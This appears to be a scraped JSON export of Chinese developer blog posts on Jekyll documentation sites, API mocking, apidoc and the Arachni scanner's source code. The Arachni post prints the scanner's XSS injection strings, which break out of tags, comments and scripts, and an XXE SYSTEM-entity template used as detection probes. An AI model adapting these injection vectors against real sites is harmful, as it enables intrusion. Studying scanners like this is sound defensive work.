","description":"","id":545,"section":"post","tags":["博文","数据","后端","接口","Django","API"],"title":"Django REST Framework 入门","uri":"https://www.chenshaowen.com/blog/101-of-django-rest-framework.html"},{"content":" 最近几年，随着单页面Web应用的崛起，各种框架也不断涌现。\n前端开始进入工程化、组件化的发展阶段。\n单页面Web技术，扩展了前端的技术边界，前端也可以路由、渲染页面，不需要依赖后端。\n后端的工作重点转向了单纯的数据API服务。\n随着各种BaaS云服务的普及，后端提供API数据接口的价值正在降低。\n没有流量的网站，没有价值。不被需要的开发，同样也没有价值。\n在前后端分离的开发模式中，怎样去再次体现后端的价值呢？可以提升如下能力：\n1. 需求分析能力 与PM一起讨论、分析需求，做技术顾问，提醒技术难点。 整合内部现有的技术资源，提供意见。 2. 解决问题能力 针对需求，提出解决方案，写方案文档。 解决开发过程中遇到的问题。比如，前端接口的鉴权等。 3. 接口能力 提供前端接口文档。 易维护性。 扩展性。 性能测试。 4. 管理能力 项目排期规划。 每天的晨会和会议记录。 项目的跟进、反馈、风险暴露。 ","description":"","id":546,"section":"post","tags":["博文","管理","后端","价值"],"title":"在前后端开发分离模式中，后端应该提升哪些能力","uri":"https://www.chenshaowen.com/blog/how-to-reflect-backend-value-in-front-and-backend-separation-mode.html"},{"content":" 技术输出型公司，一套优秀的文档管理、发布系统必不可少。文档系统是内容管理系统的一种，其对可访问性要求高、单文档更新频率低、发布频率高。笔者认为，以纯静态HTML对外发布文档是个不错的选择。但是，直接写HTML文档，费时费力、不好维护。能不能将我们常用的Markdown文档，转化为HTML对外发布呢？当然可以。本文主要介绍如何利用Jekyll搭建一套文档系统。\n1. Jekyll 1.1 简介 Jekyll是一个静态页面生成工具。它能够将Markdown文档转换生成HTML。Jekyll基于Ruby实现，可以通过gem命令安装。\n由于Jekyll具有易用、易部署、支持Markdown的特点，很多博客都采取Jekyll方案。同时，Jekyll还可以与GitHub的个人主页集成，向GitHub提交Markdown文件，就能够直接发布，十分便捷。\n1.1 项目结构 使用命令jekyll new your_project，就可以创建一个Jekyll项目。下面是常用的几个目录：\n_includes 存放页面的一些基本元素，比如footer.html，head.html，head.html，script.html等，都是可以重用的页面结构。\n_layouts 存放页面布局结构。比如，首页样式default.html，文档样式post.html。Markdown文档布局的结构，需要在文档的头部指定。\n_posts 存放Markdown文档的目录。命名格式：year-month-day-title.md。可以任意的建目录，但不可以包含中文。\n_config.yml 配置文件。可以配置，站点的基本信息，全局常量（可以在生成模板引用），URL的格式，Markdown解释引擎等。\nabout.md /about/ 路径下的关于文档。\nindex.md。 /路径下的首页文档。\nGemfile 指定需要使用的哪些包和版本。\nGemfile.lock 记录环境中已经安装的包和版本\n1.2 基本语法 由于 Jekyll 使用的是 Liquid 渲染器，将 Markdown 转换为 HTML。 Jekyll 的模板语法和 Liquid 保持一致。\nLiquid基本语法：\n# if 语句 {% if user != null %} Hello {{ user.name }} {% endif %} # for 循环 {% for item in array %} {{ item }} {% endfor %} # 过滤器 Hello {{ \u0026#39;tobi\u0026#39; | upcase }} Jekyll 常用变量：\n变量 说明 site.time 当前时间, 命令的时间点）。 site.pages 所有 Pages 的清单 site.posts 一个按照时间倒叙的所有 Posts 的清单 site.related_posts 如果当前被处理的页面是一个 Post，这个变量就会包含最多10个相关的 Post。默认的情况下， 相关性是低质量的，但是能被很快的计算出来。如果你需要高相关性，就要消耗更多的时间来计算。用这个命令带上 选项来计算高相关性的 Post site.categories.CATEGORY 所有的在 CATEGORY 类别下的帖子 site.tags.TAG 所有的在 TAG 标签下的帖子 Jekyll的官方文档中，对其用法，有很详细的说明。\n1.3 Jekyll的Windows运行环境 第一步：安装ruby和devkit。 地址，http://rubyinstaller.org/downloads/。下载ruby和devkit，安装ruby，并将其bin目录加入系统PATH。\n第一步：解压devkit，在其目录下执行命令。 1 2 ruby dk.rb init ruby dk.rb install 第三步：设置gem源。 修改安装源，\n1 gem sources --add https://gems.ruby-china.org/ --remove https://rubygems.org/ 第四步：安装Jekyll。 1 2 gem install bundler gem install jekyll 第五步：创建一个项目。 1 jekyll new document 第六步：运行项目。 1 2 cd document bundle exec jekyll serve -P 1000 这样就在http://127.0.0.1:1000，就启动了Jekyll。可能会提示缺失包，按照提示，使用gem安装即可。\n2. 构建文档系统 Jekyll 只是一个静态 HTML 的生成器。文档系统，需要考虑的不仅仅是文档的生成，还有版本管理，发布测试，负载均衡，易于编辑，快速部署等。\n2.1 部署方案 上面是一个 Nginx+Jekyll 的部署方案。\n文档编辑人员，将 Markdown 文件提交到内网的 SVN 机器，外部机器通过 svn co 命令拉取 SVN 服务器的文档自动部署。\n由于，需要一个可测试的发布环境，在部署 Jekyll 时，需要分别在 test.docs.domain.com 和 docs.domain.com 域名下部署两套。\n测试环境应该让文档编辑者，随时可以看到文档的最终转换 HTML，需要高频周期性的发布，或者利用 svn hooks 触发发布。\nJekyll 自带的 Web 服务弱，需要 Nginx 作为前端转发请求，或者直接将请求转发到 Jekyll 生成的静态网页目录 _site。\n2.2 服务配置 拉取SVN Server上的 Markdown 文档，并部署 Jekyll 的 shell 脚本。测试环境和正式环境，仅仅端口和目录不一样，测试环境端口 2000，正式环境端口 1000。\n1 2 3 4 5 6 7 8 9 10 11 12 13 if [ -z $name ] then echo \u0026#34;No process can be used to killed!\u0026#34; cd /docs/ /usr/local/bin/bundle exec /usr/local/bin/jekyll serve --watch -P 1000 \u0026amp; fi.html id=$(lsof -i:1000|tail -1|awk \u0026#39;\u0026#34;$1\u0026#34;!=\u0026#34;\u0026#34;{print $2}\u0026#39;) kill -9 $id echo \u0026#34;Process name=$name($id) kill!\u0026#34; cd /docs/ /usr/bin/svn co https://svn.domain.com/document/ cd /docs/ /usr/local/bin/bundle exec /usr/local/bin/jekyll serve -P 1000 \u0026amp; 测试环境的部署脚本，可以使用 crontab 命令，添加周期任务。\nNginx的配置\n# 正式环境配置 server { listen 80; server_name docs.domain.com;\tlocation / { proxy_pass http://127.0.0.1:1000; } } # 测试环境配置，测试环境还可以配置一下白名单 server { listen 80; server_name test.docs.domain.com;\tlocation / { proxy_pass http://127.0.0.1:2000; } } 3. 实践建议 permalink 是 URL 的生成规则设置。在 _config.yaml 和文档的头部，都可以设置。根据URL的生产规则，如果两篇文档生成的URL相同，那么仅仅只能发布成功一篇。特别是多人合作时，一定要保证不会生成相同的文档URL。\nCDN方案更佳。\n本文提供的是 Nginx 作为反向代理的方案，依然具有一定的维护成本，同时，无法抵御可能的安全风险。对于，帮助文档和官网，这类静态内容的站点，还有一种更好的方案 - CDN。将静态文件直接上传到 CDN ，然后将 CDN 绑定到 docs.domain.com 即可。如何批量上传文件到七牛 CDN，请查看七牛存储批量操作 - qshell。\n4. 参考 http://jekyll.com.cn/ ","description":"","id":547,"section":"post","tags":["博文","Demo","设计"],"title":"用 Jekyll 搭建文档系统","uri":"https://www.chenshaowen.com/blog/how-to-develop-document-system-using-jekyll.html"},{"content":" 前后端分离开发中，当后端 API 没有完成时，前端无法继续调试。为了前后端能并行开发，前端需要一套 API 的接口环境，这个就是 Mock API 。下面的图，对开发流程进行了很好的顺理。如果没有 Mock 数据的环节，前后端的联调会消耗非常多的时间。\n1. 何为 Mock ，模拟也 通常，后端提供的 API 文档，不能满足前端调试需求。在合作开发的过程中，最好能提供，一个模拟的 API 数据请求接口。有几种方法可以模拟接口调用：\n1 . 手工 Mock 数据。\n手工填写模拟数据，保存为 json，本地运行一个 HttpServer，模拟 API 调用返回数据。缺点是，无法生成批量的数据，不具有随机性，路由不方便管理。如果，本地不运行HttpServer服务，前端直接使用静态 json，上线前还需要变更URL。\n2 . 前端 Mock。\n劫持 Ajax ， 通过拦截 Ajax请求，返回一定格式的假数据。缺点是，需要引入 mock-api.js文件，每个页面都需要一个对应的 mock-api.js 的文件，管理好这些 mock-api.js 会有一定挑战。\n3 . 后端 Mock。\n使用类似 swagger 的工具。\n根据工具定义的模板规则，配置接口信息，生成 Mock 数据。缺点是操作比较复杂，需要后端人员的配合。 Mock-server。\n在本地运行一个静态服务，将接口请求，转换为 json 静态文件或者生成规则的请求。 2. 前端 Mock.js 2.1 Mock.js 主要功能 基于数据模板生成模拟数据 基于 HTML 模板生成模拟数据 拦截并模拟 ajax 请求 2.2 Mock.js使用 Mock.js 有不同的前端库可以使用。使用的方法类似，\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;script\u0026gt; Mock.mock(\u0026#39;/api/users\u0026#39;, { \u0026#39;users|1-10\u0026#39;: [{ \u0026#39;id|+1\u0026#39;: 1 }] }); $.ajax({ url: \u0026#39;/api/users\u0026#39;, success: function(result) { console.log(result); } }); \u0026lt;/script\u0026gt; 3. 后端 json-server 3.1 json-server 主要功能 REST 风格的 API 接口。 支持 CORS 和 JSONP 跨域请求。 自定义路由。 支持中间件。 模块化。 3.2 json-server 使用 安装 json-server\n1 npm install json-server -g data.json\n1 2 3 4 5 6 7 8 9 10 11 12 { \u0026#34;event\u0026#34;: [ { \u0026#34;id\u0026#34;: 1, \u0026#34;tips\u0026#34;: \u0026#34;A\u0026#34; }, { \u0026#34;id\u0026#34;: 2, \u0026#34;tips\u0026#34;: \u0026#34;B\u0026#34; } ] } 启动服务\n1 json-server data.json -p 1000 访问方法\nhttp://localhost:1000/ 页面会显示资源列表、支持的方法（GET、 POST、 PUT、 PATCH、 DELETE、 OPTIONS）\nGET方法获取资源信息，http://localhost:1000/event?id=1。\n1 2 3 4 5 6 [ { \u0026#34;id\u0026#34;: 1, \u0026#34;tips\u0026#34;: \u0026#34;A\u0026#34; } ] 分页查询参数: _start, _end, _limit。 排序参数: _sort, _order。 操作符: _gte大于，_lte小于， _ne非， _like模糊查询 使用POST等方法更新的数据，会使用lowdb同步到data.json文件。\n3.3 生成动态数据 json-server，支持使用js动态生成数据\ndata.js， 生成1000组，{\u0026ldquo;id\u0026rdquo;: 0, \u0026ldquo;tips\u0026rdquo;: \u0026ldquo;tips0\u0026rdquo;} id递增的数据。\n1 2 3 4 5 6 7 module.exports = function() { var data = { event: [] } for (var i = 0; i \u0026lt; 1000; i++) { data.event.push({ id: i, tips: \u0026#39;tips\u0026#39; + i }) } return data } 启动命令\n1 json-server data.js -p 1000 自定义路由\nroutes.json\n1 2 3 { \u0026#34;/api/event/:id\u0026#34;: \u0026#34;/event?id=:id\u0026#34; } 访问URL:http://localhost:3000/api/event/1/\n启动命令\n1 json-server data.json --routes routes.json 其他配置选项\njson-server [options] \u0026lt;source\u0026gt; Options: --config, -c Path to config file [default: \u0026#34;json-server.json\u0026#34;] --port, -p Set port [default: 3000] --host, -H Set host [default: \u0026#34;0.0.0.0\u0026#34;] --watch, -w Watch file(s) [boolean] --routes, -r Path to routes file --middlewares, -m Paths to middleware files [array] --static, -s Set static files directory --read-only, --ro Allow only GET requests [boolean] --no-cors, --nc Disable Cross-Origin Resource Sharing [boolean] --no-gzip, --ng Disable GZIP Content-Encoding [boolean] --snapshots, -S Set snapshots directory [default: \u0026#34;.\u0026#34;] --delay, -d Add delay to responses (ms) --id, -i Set database id property (e.g. _id) [default: \u0026#34;id\u0026#34;] --quiet, -q Suppress log messages from output [boolean] --help, -h Show help [boolean] --version, -v Show version number 4. 参考 https://github.com/nuysoft/Mock/wiki https://github.com/lifesinger/blog/issues/184 https://github.com/typicode/json-server http://elijahmanor.com/angry-birds-of-javascript-green-bird-mocking/ https://www.npmjs.com/package/json-server ","description":"","id":548,"section":"post","tags":["博文","前端","后端"],"title":"前后端分离  - Mock数据","uri":"https://www.chenshaowen.com/blog/mock-server.html"},{"content":" Arachni是一个基于Ruby on Rails框架的Web安全漏洞扫描工具。\n1. Ruby on Rails Ruby on Rails ，缩写ROR，是一个Web框架，包括两部分内容： Ruby 语言和 Rails 框架。Ruby一直以来流行于日本，直到2004年，26 岁的丹麦人 David Heinemeier Hansson 提出了Web框架 - Rails。这才让全世界人们，开始了解Ruby和Rails的灵活与高效。\n1.1 Ruby 日本人松本行弘（ Matsumoto Yukihiro），在 1993 年开始着手 Ruby 语言的研发工作。1995 年 12 月 推出了 Ruby 的第一个版本 Ruby 0.95。\n语言特点：\n纯的面向对象语言 解释型脚本语言 动态载入 自动内存管理机制 多精度整数 迭代器和闭包 开源项目 1.2 Rails Rails 结合了PHP快速开发、Java程序规整的优点，是一个符合实际需要而且更高效的 Web 开发框架。\n框架特点：\n全栈式的 MVC 框架。自带Model, View，Controller层工具 使用约定，而不是XML配置 支架系统。可以自动为数据表创建CRUD操作和前台视图 开发效率高，代码量少 2. Arachni-ui-web目录结构 Arachni-ui-web，是Arachni的一个前端交互。Arachni 核心部分在，system/ruby/lib/ruby/gems/2.2.0/gems/arachni-1.5.1目录下。\n2.1 bin目录 保存的是面向用户的执行脚本，提供基本的启动、操作命令。\n2.2 system目录 包括Ruby执行环境，依赖包，项目的源码，日志目录，用户home目录等。可以说，system包含了项目所需的一切。\nsystem/arachni-ui-web是项目的源码目录。其中：\napp目录。项目的主目录，大部分的项目代码都在其中 app/assets目录。包含了前端的资源，javascript、css、images app/controllers目录。包含了所有的controller，在Rails中一般controller就是指REST架构中的资源。controller里实现了各种action，用于响应web请求。 也是MVC架构中的C层 app/helper目录。用于存放一些helper方法，这些helper方法一般用在view层，用于组织一些用于view的逻辑代码 app/mailers目录。用于放和邮件发送相关的代码 app/models目录。用于放各种数据库映射的model，一些数据操作以及业务逻辑代码，都应该放在这里。 MVC架构中的M层 app/views目录。用于放views层的模板，经过controller渲染这些模板，最后生成可供用户访问的页面。MVC架构中的V层 bin目录。Rails的命令，以及bundle、rake命令 config目录。配置项目运行规则、数据库等 db目录。当前的数据库模式,以及数据库迁移 features目录。数据文件 lib目录。项目扩展包 log目录。系统日志文件 public目录。公共资源，包含静态文件和链接资源 script目录。 项目运行或清理的脚步 spec 目录。RSpec工具的测试文件 tmp目录。临时文件文件 vendor目录。第三方代码，插件等 其他重要文件：\nconfig/routes.rb。\n指定项目所有的路由配置，也就是说，所有的web请求收发规则，都由这里指定 db/seeds.rb。\n初始化数据库 3. Arachni XSS 安全测试的代码，主要存放在 arachni-1.5.1/components/checks/\nArachni 检测XSS的原理是，随机生成一个ID或者指定一个特殊字符串，作为注入的XSS向量，如果页面内容中查找到了这个ID或字符串，则存在XSS漏洞。\n函数的基本执行流程是，先拼接XSS向量（tag_name，strings，options），然后run( )执行，最后找证据（find_included_payload，check_and_log，find_proof）。\nxss.rb。 直接注入\u0026lt;\u0026gt;标记的HTML，还可以注入带编码的XSS向量。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 def self.tag_name \u0026#34;#{shortname}_#{random_seed}\u0026#34; end def self.tag \u0026#34;\u0026lt;#{tag_name}/\u0026gt;\u0026#34; end def self.strings @strings ||= [ # Straight injection. tag, # Go for an error. \u0026#34;()\\\u0026#34;\u0026amp;%1\u0026#39;-;#{tag}\u0026#39;\u0026#34;, # Break out of HTML comments and text areas. \u0026#34;\u0026lt;/textarea\u0026gt;--\u0026gt;#{tag}\u0026lt;!--\u0026lt;textarea\u0026gt;\u0026#34; ].map{ |p| [p, Form.encode( p ) ]}.flatten.uniq end xss_dom.rb。 检测DOM型的XSS攻击。XSS DOM是，使用类似document.body.innerHTML的执行，动态向页面注入XSS。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 prefer :xss def self.tag_name \u0026#34;#{shortname}_#{random_seed}\u0026#34; end def self.tag \u0026#34;\u0026lt;#{tag_name}/\u0026gt;\u0026#34; end def self.strings @strings ||= [ # Straight injection. tag, # Break out of HTML comments and text areas. \u0026#34;\u0026lt;/textarea\u0026gt;--\u0026gt;#{tag}\u0026lt;!--\u0026lt;textarea\u0026gt;\u0026#34; ] end xss_dom_script_context.rb。 检测XSS DOM漏洞，注入的内容为JavaScript代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 prefer :xss_script_context def self.seed \u0026#39;window.top._%s_taint_tracer.log_execution_flow_sink()\u0026#39; end def self.strings @strings ||= [ \u0026#34;javascript:#{seed}//\u0026#34;, \u0026#34;1;#{seed}//\u0026#34;, \u0026#34;\u0026#39;;#{seed}//\u0026#34;, \u0026#34;\\\u0026#34;;#{seed}//\u0026#34;, \u0026#34;*/;#{seed}/*\u0026#34; ] end xss_event.rb。 基于事件和属性的XSS。类型有， \u0026lsquo;onload\u0026rsquo;, \u0026lsquo;onunload\u0026rsquo;, \u0026lsquo;onblur\u0026rsquo;, \u0026lsquo;onchange\u0026rsquo;, \u0026lsquo;onfocus\u0026rsquo;, \u0026lsquo;onreset\u0026rsquo;, \u0026lsquo;onselect\u0026rsquo;, \u0026lsquo;onsubmit\u0026rsquo;, \u0026lsquo;onabort\u0026rsquo;, \u0026lsquo;onkeydown\u0026rsquo;, \u0026lsquo;onkeypress\u0026rsquo;, \u0026lsquo;onkeyup\u0026rsquo;, \u0026lsquo;onclick\u0026rsquo;, \u0026lsquo;ondblclick\u0026rsquo;, \u0026lsquo;onmousedown\u0026rsquo;, \u0026lsquo;onmousemove\u0026rsquo;, \u0026lsquo;onmouseout\u0026rsquo;, \u0026lsquo;onmouseover\u0026rsquo;, \u0026lsquo;onmouseup\u0026rsquo;, \u0026lsquo;src\u0026rsquo;。\n1 2 3 4 5 6 7 8 9 10 11 def self.attribute_name \u0026#39;arachni_xss_in_element_event\u0026#39; end def self.strings @strings ||= [ \u0026#34;;#{attribute_name}=#{random_seed}//\u0026#34;, \u0026#34;\\\u0026#34;;#{attribute_name}=#{random_seed}//\u0026#34;, \u0026#34;\u0026#39;;#{attribute_name}=#{random_seed}//\u0026#34; ].map { |s| [ \u0026#34; script:#{s}\u0026#34;, \u0026#34; #{s}\u0026#34; ] }.flatten end xss_path.rb。 拼接URL，检验反射型的XSS。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 def self.tag @tag ||= \u0026#39;my_tag_\u0026#39; + random_seed end def self.string @string ||= \u0026#39;\u0026lt;\u0026#39; + tag + \u0026#39;/\u0026gt;\u0026#39; end def self.requests @requests ||= [ [ string, {} ], [ \u0026#39;\u0026gt;\u0026#34;\\\u0026#39;\u0026gt;\u0026#39; + string, {} ], [ \u0026#39;\u0026#39;, { string =\u0026gt; \u0026#39;\u0026#39; } ], [ \u0026#39;\u0026#39;, { \u0026#39;\u0026gt;\u0026#34;\\\u0026#39;\u0026gt;\u0026#39; + string =\u0026gt; \u0026#39;\u0026#39; } ], [ \u0026#39;\u0026#39;, { \u0026#39;\u0026#39; =\u0026gt; string } ], [ \u0026#39;\u0026#39;, { \u0026#39;\u0026#39; =\u0026gt; \u0026#39;\u0026gt;\u0026#34;\\\u0026#39;\u0026gt;\u0026#39; + string } ] ] end xss_script_context.rb。 利用 script标签注入JavaScript。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 def self.seed \u0026#39;window.top._%s_taint_tracer.log_execution_flow_sink()\u0026#39; end def self.strings return @strings if @strings @strings ||= [ \u0026#34;javascript:#{seed}\u0026#34; ] [\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;\u0026#39;].each do |quote| [ \u0026#34;%q;#{seed}%q\u0026#34;, \u0026#34;%q;#{seed};%q\u0026#34; ].each do |payload| @strings \u0026lt;\u0026lt; payload.gsub( \u0026#39;%q\u0026#39;, quote ) end end [ \u0026#34;1;#{seed}%q\u0026#34;, \u0026#34;1;\\n#{seed}%q\u0026#34; ].each do |payload| [\u0026#39;\u0026#39;, \u0026#39;;\u0026#39;].each do |s| @strings \u0026lt;\u0026lt; payload.gsub( \u0026#39;%q\u0026#39;, s ) end end @strings = @strings.map { |s| [ s, \u0026#34;#{s}//\u0026#34; ] }.flatten @strings \u0026lt;\u0026lt; \u0026#34;*/;\\n#{seed}/*\u0026#34; # In case they\u0026#39;re placed as assoc array values. @strings \u0026lt;\u0026lt; seed @strings \u0026lt;\u0026lt; \u0026#34;\\\u0026#34;,x:#{seed},y:\\\u0026#34;\u0026#34; @strings \u0026lt;\u0026lt; \u0026#34;\u0026#39;,x:#{seed},y:\u0026#39;\u0026#34; @strings \u0026lt;\u0026lt; \u0026#34;\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;#{seed}\u0026lt;/script\u0026gt;\u0026#34; end xss_tag.rb。\n利用HTML标签属性执行XSS。 1 2 3 4 5 ATTRIBUTE_NAME = \u0026#39;arachni_xss_in_tag\u0026#39; def self.strings @strings ||= [\u0026#39;\u0026#39;, \u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;]. map { |q| \u0026#34;#{q} #{ATTRIBUTE_NAME}=#{q}#{random_seed}#{q} blah=#{q}\u0026#34; } end xxe.rb。 XML External Entity Injection，简称XXE，发生在应用程序解析 XML 输入时，没有禁止外部实体的加载。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 def self.options @options ||= { format: [Format::STRAIGHT], signatures: FILE_SIGNATURES_PER_PLATFORM.select { |k, _| payloads.include? k }, each_mutation: proc do |mutation| mutation.platforms.pick( payloads ).map do |platform, payloads| payloads.map do |payload| m = mutation.dup m.transform_xml do |xml| xml.sub( m.affected_input_value, \u0026#34;\u0026amp;#{ENTITY};\u0026#34; ) end m.audit_options[:platform] = platform m.source = \u0026#34;\u0026lt;!DOCTYPE #{ENTITY} [ \u0026lt;!ENTITY #{ENTITY} SYSTEM \\\u0026#34;#{payload}\\\u0026#34;\u0026gt; ]\u0026gt;\\n#{m.source}\u0026#34; m end end end } end Tips:\n如果在Windows下启动Arachni，遇到提示：\nfind: \u0026lsquo;/C\u0026rsquo;: No such file or directory\nfind: \u0026lsquo;/I\u0026rsquo;: No such file or directory\n这是由于，本地安装了Cygwin，导致Windows自带的find命令被覆盖。需要将Arachni\\system文件夹下，setenv.bat文件第17行find，替换为\u0026quot;%windir%\\system32\\FIND.exe\u0026quot;。\n4. 参考 https://blackanger.gitbooks.io/tao-of-chef/chapter_5_rails/index.html http://liuzxc.github.io/blog/rspec-usage/ ","description":"","id":549,"section":"post","tags":["博文","工具","安全","源码"],"title":"安全扫描工具Arachni源码分析（一）","uri":"https://www.chenshaowen.com/blog/source-code-analysis-of-arachni-1.html"},{"content":" 在前后端分离框架中，API 文档频繁交接。如果涉及到第三方接口调用，多方合作场景下，API 和文档变更可能会更快。为了方便维护 API 和交接文档，这里给大家推荐一款文档生成工具 - apidoc\n1.apidoc 简介 apidoc 是一个基于 nodejs 的 API 文档生成工具，从代码注释中提取特定格式的内容，生成 API 文档。\n目前支持的语言有：C#、C/C++、D、Erlang、Go、Groovy、Java、Javascript、Pascal/Delphi、Perl、PHP、Python、Rust、Ruby、Scala 和 Swift。\n特点：\n跨平台，linux、windows、macOS 等都支持。 支持语言广泛。 支持文档版本管理。 支持多个不同语言的多个项目生成一份文档。 输出模板可自定义。 2. 举个例子 以 Django 为例，在 views 函数中写注释\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 def myview(request, id): \u0026#34;\u0026#34;\u0026#34; @api {GET} ci/app/:id/ 获取应用详情 @apiVersion 1.0.0 @apiDescription 获取应用详情 @apiName getAppDetail @apiGroup Application @apiSuccessExample 请求成功 HTTP/1.1 200 OK { \u0026#34;result\u0026#34;: true, \u0026#34;data\u0026#34;: [], \u0026#34;code\u0026#34;: 0, \u0026#34;message\u0026#34;: u\u0026#39;成功说明\u0026#39; } @apiSuccess {Boolean} result true @apiSuccess {Array} data 数据列表 @apiSuccess {Number} code 0 @apiSuccess {String} message 说明 \u0026#34;\u0026#34;\u0026#34; 生成的 API 文档\n3. apidoc 支持的关键字 apidoc 通过抽取代码注释，根据关键字语法生成 API 文档。所以，如果想生成理想的 API 文档，一定要遵循 apidoc 的相关关键字语法。下面是一个关键字语法的 list，{ }表示需要替换的变量，[ ]表示可选参数：\n@api {method} path [title]。\n只有使用@api 标注的注释块才会在解析之后生成文档，title 会被解析为导航菜单(@apiGroup)下的小菜单\nmethod 可以有空格，如{POST GET} @apiGroup name。\n分组名称，被解析为导航栏菜单 @apiName name。\n接口名称，在同一个@apiGroup 下，名称相同的@api 通过@apiVersion 区分，否者后面@api 会覆盖前面定义的@api @apiDescription text。\n接口描述，支持 html 语法 @apiVersion verison。\n接口版本，major.minor.patch 的形式 @apiIgnore [hint]。\napidoc 会忽略使用@apiIgnore 标注的接口，hint 为描述 @apiSampleRequest url。\n接口测试地址以供测试，发送请求时，@api method 必须为 POST/GET 等其中一种 @apiDefine name [title] [description]。\n定义一个注释块(不包含@api)，配合@apiUse 使用可以引入注释块\n在@apiDefine 内部不可以使用@apiUse @apiUse name。\n引入一个@apiDefine 的注释块 @apiParam [(group)] [{type}] [field=defaultValue] [description]。请求参数 @apiHeader [(group)] [{type}] [field=defaultValue] [description]。头部参数 @apiError [(group)] [{type}] field [description]。响应错误时参数 @apiSuccess [(group)] [{type}] field [description]。成功时参数，\ngroup 表示参数的分组，type 表示类型(不能有空格)，入参可以定义默认值(不能有空格) @apiParamExample [{type}] [title] example。参数请求用例 @apiHeaderExample [{type}] [title] example。头部请求用例 @apiErrorExample [{type}] [title] example。错误请求用例 @apiSuccessExample [{type}] [title] example。成功请求用例\ntype 表示的是 example 的语言类型， example 内容会被直接解析显示。 @apiPermission name。\nname 必须独一无二，描述@api 的访问权限，如 admin/anyone 4. 安装配置 apidoc 安装 apidoc 这里默认已经安装了 nodejs，如果没有安装，请自行下载安装。全局安装 apidoc:\n1 npm install apidoc -g 配置 配置是可选的，没有配置并不影响文档的生成。只是缺失部分 API 文档信息而已。在工程的根目录下，创建 apidoc.json 文件，配置文档的基本信息:\n1 2 3 4 5 6 { \u0026#34;name\u0026#34;: \u0026#34;项目API文档\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;项目API文档-说明\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;项目API文档-title\u0026#34; } 生成文档 在 apidoc.json 所在的目录下，执行命令：\n1 apidoc -i ./ -i 参数表示输入的目录，默认生成的文档在当前目录下的/doc，也可以通过-o 参数指定。\n5. apidoc 自动生成 每次更新代码注释之后，执行一次**apidoc -i ./**才能看到 API 文档，比较麻烦。能不能每次修改注释之后，自动生成 API 文档呢？当然可以。\n安装 gaze gaze 是基于 nodejs 的文件监控项目。\n1 npm install gaze -g 编写监控代码 apidoc-watch.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 var gaze = require(\u0026#34;gaze\u0026#34;); var exec = require(\u0026#34;child_process\u0026#34;).exec; function Watch() { gaze(\u0026#34;./*.*\u0026#34;, function (error, watcher) { this.on(\u0026#34;all\u0026#34;, function (event, filepath) { console.log(filepath + \u0026#34; was \u0026#34; + event); Geneartion(); }); }); } function Geneartion() { var msg = exec(\u0026#34;apidoc -e ./node_modules/\u0026#34;); msg.stdout.on(\u0026#34;data\u0026#34;, function (data) { console.log(\u0026#34;生成Api-\u0026gt;\u0026#34; + data); }); msg.stderr.on(\u0026#34;data\u0026#34;, function (data) { console.log(\u0026#34;生成出错-\u0026gt;\u0026#34; + data); }); } Geneartion(); Watch(); console.log(\u0026#34;正在监听......\u0026#34;); 执行监控 只需要更新注释之前，执行一次命令即可。\n1 node apidoc-watch.js 6. 项目实践建议 6.1 文档的交接方式 建议将 API 文档生成在前端的 static 目录下，以链接的形式交接，比如: htttp://example.com/static/doc/index.html。\n6.2 后端注释组织方式 以 Django 为例，由于 apidoc 需要的注释量比较大，有两种选择：\n一种是将注释直接写在每个 views 函数中， 一种是单独使用一个文件或文件夹来写注释。 django 中建议skinny controller, fat model，views.py 中少些代码，多写注释，第一种方案比较合适。同时，注释和接口实现放在一起，可以降低二次维护学习成本。\n6.3 使用 apiDefine 和 apiUse 由于前后端，常常会约定固定格式的返回。可以将格式固定的部分，使用 apiDefine 定义为一个注释块，在其他地方使用 apiUse 引用。可以有效减少注释量。\n定义注释块，注意：一个注释块应该被定义为一个单独的注释：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 \u0026#34;\u0026#34;\u0026#34; @apiDefine success @apiSuccessExample 请求成功 HTTP/1.1 200 OK { \u0026#34;result\u0026#34;: true, \u0026#34;data\u0026#34;: [], \u0026#34;code\u0026#34;: 0, \u0026#34;message\u0026#34;: u\u0026#39;成功说明\u0026#39; } @apiSuccess {Boolean} result true @apiSuccess {Array} data 数据列表 @apiSuccess {Number} code 0 @apiSuccess {String} message 说明 \u0026#34;\u0026#34;\u0026#34; \u0026#34;\u0026#34;\u0026#34; @apiDefine error @apiErrorExample 请求失败 HTTP/1.1 40X error { \u0026#34;result\u0026#34;: false, \u0026#34;data\u0026#34;: [], \u0026#34;code\u0026#34;: -1, \u0026#34;message\u0026#34;: u\u0026#39;失败提示\u0026#39; } @apiError {Boolean} result false @apiError {Array} data 空 @apiError {Number} code 错误码 @apiError {String} message 提示 \u0026#34;\u0026#34;\u0026#34; 其他地方引用\n1 2 3 4 5 6 7 8 9 def myview(request, id): \u0026#34;\u0026#34;\u0026#34; @api {GET} ci/app/:id/ 获取应用详情 @apiVersion 1.0.0 @apiDescription 获取应用详情 @apiName getAppDetail @apiGroup Application @apiUse success \u0026#34;\u0026#34;\u0026#34; 6.4 合理使用 apiGroup 分组 apiGroup、apiName 会被拼接到 URL 中，比如：static/doc/index.html#api-apiGroup-apiName。给 apiGroup、apiName 取个容易理解的名字很重要。合理使用 apiGroup，将前端相关的功能聚集在一起，有利于前端理解 API 的用途。\n7. 参考 http://apidocjs.com/ https://github.com/shama/gaze https://github.com/apidoc/apidoc 